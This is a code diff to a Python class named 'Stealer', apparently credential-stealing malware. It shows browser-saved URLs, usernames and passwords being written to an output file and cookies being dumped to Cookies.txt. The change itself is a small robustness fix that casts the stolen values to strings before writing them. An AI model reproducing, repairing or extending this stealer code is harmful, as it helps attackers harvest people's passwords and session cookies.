@@ -64,9 +64,9 @@ class Stealer():
 						password = item['Password']
 					except:
 						password = ""
-					file.write("URL : " + url + "\n")
-					file.write("Username : " + username + "\n")
-					file.write("Password : " + password + "\n\n")
+					file.write("URL : " + str(url) + "\n")
+					file.write("Username : " + str(username) + "\n")
+					file.write("Password : " + str(password) + "\n\n")
 			if "Cookies" in result[browser].keys():
 				filename = outdir + "Cookies.txt"
 				file = open(filename,"w")
